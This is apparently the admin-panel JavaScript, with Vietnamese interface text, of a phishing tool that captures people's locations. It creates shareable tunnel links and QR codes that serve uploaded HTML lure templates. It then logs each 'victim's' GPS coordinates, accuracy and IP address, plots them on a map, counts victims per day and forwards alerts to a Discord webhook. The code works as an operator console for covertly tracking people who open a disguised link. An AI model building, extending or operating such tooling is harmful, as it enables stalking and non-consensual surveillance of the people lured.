// ===========================
// GPS TUNNEL ADMIN – FRONTEND LOGIC
// ===========================

let map;
let markers = [];

// SSE Connection
const evtSource = new EventSource('/stream');
evtSource.onmessage = (e) => {
  const msg = JSON.parse(e.data);
  handleSSE(msg.type, msg.data);
};
evtSource.onerror = () => {
  document.getElementById('connection-status').className = 'status-dot';
  document.getElementById('connection-status').nextElementSibling.textContent = 'Mất kết nối';
};

function handleSSE(type, data) {
  switch(type) {
    case 'tunnel_created':
      addTunnelRow(data);
      updateStats();
      break;
    case 'tunnel_stopped':
    case 'tunnel_error':
    case 'tunnel_restarted':
      loadTunnels();
      updateStats();
      break;
    case 'new_gps':
      addVictimRow(data);
      updateMapMarker(data);
      updateStats();
      break;
    case 'webhook_error':
      alert(`Webhook lỗi: ${data.platform}`);
      break;
  }
}

// ================== NAVIGATION ==================
document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    item.classList.add('active');
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.getElementById(`tab-${item.dataset.tab}`).classList.add('active');
    if (item.dataset.tab === 'victims') initMap();
    if (item.dataset.tab === 'tunnels') loadTunnels();
    if (item.dataset.tab === 'victims') loadVictims();
    if (item.dataset.tab === 'templates') loadTemplates();
  });
});

// ================== TUNNELS ==================
async function createTunnel(quantity = null) {
  const q = quantity || document.getElementById('tunnel-quantity').value || 1;
  const res = await fetch('/api/tunnels', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ quantity: parseInt(q) })
  });
  const json = await res.json();
  if (json.success) {
    loadTunnels();
    updateStats();
  } else {
    alert('Lỗi: ' + json.error);
  }
}

async function stopTunnel(id) {
  await fetch(`/api/tunnels/${id}`, { method: 'DELETE' });
  loadTunnels();
  updateStats();
}

async function stopAllTunnels() {
  await fetch('/api/tunnels', { method: 'DELETE' });
  loadTunnels();
  updateStats();
}

async function loadTunnels() {
  const res = await fetch('/api/tunnels');
  const json = await res.json();
  const tbody = document.querySelector('#tunnels-table tbody');
  tbody.innerHTML = '';
  if (json.data && json.data.length > 0) {
    json.data.forEach(tunnel => {
      const row = tbody.insertRow();
      row.innerHTML = `
        <td>${tunnel.id}</td>
        <td><a href="${tunnel.url}" target="_blank">${tunnel.url || 'N/A'}</a></td>
        <td><span class="chip" style="cursor:default; background:${tunnel.status === 'running' ? '#2BA64020' : tunnel.status === 'error' ? '#FF000020' : '#71717120'}; color:${tunnel.status === 'running' ? '#2BA640' : tunnel.status === 'error' ? '#FF0000' : '#717171'};">${tunnel.status}</span></td>
        <td>${new Date(tunnel.created_at * 1000).toLocaleString()}</td>
        <td>
          <button class="btn-secondary" style="padding:4px 12px; font-size:12px;" onclick="copyToClipboard('${tunnel.url}')">Copy</button>
          <button class="btn-secondary" style="padding:4px 12px; font-size:12px;" onclick="showQR('${tunnel.url}')">QR</button>
          <button class="btn-outlined" style="padding:4px 12px; font-size:12px; color:#FF0000; border-color:#FF0000;" onclick="stopTunnel(${tunnel.id})">Dừng</button>
        </td>
      `;
    });
  } else {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: #717171;">Chưa có tunnel nào. Nhấn "Tạo Tunnel" để bắt đầu.</td></tr>';
  }
}

function addTunnelRow(tunnel) {
  const tbody = document.querySelector('#tunnels-table tbody');
  const row = tbody.insertRow(0);
  row.style.animation = 'fadeIn 0.3s ease';
  row.innerHTML = `
    <td>${tunnel.id}</td>
    <td><a href="${tunnel.url}" target="_blank">${tunnel.url}</a></td>
    <td><span class="chip" style="cursor:default; background:#2BA64020; color:#2BA640;">${tunnel.status}</span></td>
    <td>${new Date().toLocaleString()}</td>
    <td>
      <button class="btn-secondary" style="padding:4px 12px; font-size:12px;" onclick="copyToClipboard('${tunnel.url}')">Copy</button>
      <button class="btn-secondary" style="padding:4px 12px; font-size:12px;" onclick="showQR('${tunnel.url}')">QR</button>
      <button class="btn-outlined" style="padding:4px 12px; font-size:12px; color:#FF0000; border-color:#FF0000;" onclick="stopTunnel(${tunnel.id})">Dừng</button>
    </td>
  `;
}

// ================== VICTIMS ==================
async function loadVictims() {
  const res = await fetch('/api/victims?limit=50');
  const json = await res.json();
  const tbody = document.querySelector('#victims-table tbody');
  tbody.innerHTML = '';
  if (json.data && json.data.length > 0) {
    json.data.forEach(v => {
      const row = tbody.insertRow();
      row.innerHTML = `
        <td>${new Date(v.received_at).toLocaleString()}</td>
        <td>${v.lat?.toFixed(4) || '-'}</td>
        <td>${v.lng?.toFixed(4) || '-'}</td>
        <td>${v.accuracy ? v.accuracy+'m' : '-'}</td>
        <td>${v.ip_address || '-'}</td>
      `;
    });
  } else {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color: #717171;">Chưa có dữ liệu mục tiêu.</td></tr>';
  }
}

function addVictimRow(v) {
  const tbody = document.querySelector('#victims-table tbody');
  if (tbody.querySelector('td[colspan]')) tbody.innerHTML = '';
  const row = tbody.insertRow(0);
  row.style.animation = 'fadeIn 0.3s ease';
  row.innerHTML = `
    <td>${new Date().toLocaleString()}</td>
    <td>${v.lat?.toFixed(4) || '-'}</td>
    <td>${v.lng?.toFixed(4) || '-'}</td>
    <td>${v.accuracy ? v.accuracy+'m' : '-'}</td>
    <td>${v.ip || '-'}</td>
  `;
}

function initMap() {
  if (!map) {
    map = L.map('map').setView([0, 0], 2);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      attribution: '&copy; OpenStreetMap & CartoDB'
    }).addTo(map);
  }
}

function updateMapMarker(data) {
  if (!map) initMap();
  const lat = data.lat || data.latitude;
  const lng = data.lng || data.longitude;
  if (lat && lng) {
    const marker = L.marker([lat, lng]).addTo(map);
    markers.push(marker);
    map.setView([lat, lng], 13);
  }
}

// ================== TEMPLATES ==================
async function loadTemplates() {
  const res = await fetch('/api/templates');
  const json = await res.json();
  const container = document.getElementById('template-list');
  if (json.data && json.data.length > 0) {
    container.innerHTML = json.data.map(t => `
      <div class="template-card">
        <h3>${t.title}</h3>
        <p>File: ${t.filename}</p>
        <p>Trạng thái: ${t.active ? 'Đang hoạt động' : 'Đã tắt'}</p>
        <button class="btn-secondary" style="margin-top:8px;" onclick="toggleTemplate(${t.id})">${t.active ? 'Tắt' : 'Bật'}</button>
      </div>
    `).join('');
  } else {
    container.innerHTML = '<p style="color:#717171;">Chưa có template nào.</p>';
  }
}

async function toggleTemplate(id) {
  await fetch(`/api/templates/${id}/toggle`, { method: 'POST' });
  loadTemplates();
}

function uploadTemplate() {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.html';
  input.onchange = async (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const form = new FormData();
    form.append('file', file);
    await fetch('/api/templates/upload', { method: 'POST', body: form });
    loadTemplates();
  };
  input.click();
}

// ================== QR ==================
function showQR(url) {
  fetch('/api/qr', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url })
  }).then(r => r.json()).then(data => {
    document.getElementById('qr-image').src = 'data:image/png;base64,' + data.data;
    document.getElementById('qr-url').textContent = url;
    document.getElementById('qr-modal').style.display = 'flex';
  });
}

function closeModal() {
  document.getElementById('qr-modal').style.display = 'none';
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    // Thông báo nhẹ
    const toast = document.createElement('div');
    toast.textContent = 'Đã sao chép';
    toast.style.cssText = 'position:fixed; bottom:20px; right:20px; background:#2BA640; color:white; padding:8px 16px; border-radius:8px; font-size:14px; z-index:9999;';
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2000);
  });
}

// ================== SETTINGS ==================
document.getElementById('settings-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const data = {
    discord_webhook: document.getElementById('webhook-url').value,
    max_tunnels: document.getElementById('max-tunnels').value,
    auto_stop_minutes: document.getElementById('auto-stop-minutes').value
  };
  await fetch('/api/settings', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  alert('Đã lưu cài đặt');
});

// ================== STATS ==================
async function updateStats() {
  const [tunRes, vicRes] = await Promise.all([
    fetch('/api/tunnels'),
    fetch('/api/victims/stats')
  ]);
  const tunnels = (await tunRes.json()).data;
  const vstats = (await vicRes.json()).data;

  document.getElementById('stat-total-tunnels').textContent = tunnels.length;
  document.getElementById('stat-running-tunnels').textContent = tunnels.filter(t => t.status === 'running').length;
  document.getElementById('stat-victims-today').textContent = vstats.today;
  document.getElementById('stat-victims-total').textContent = vstats.total;
}

// ================== INIT ==================
document.addEventListener('DOMContentLoaded', () => {
  updateStats();
  loadTunnels();
  loadVictims();
  loadTemplates();
});
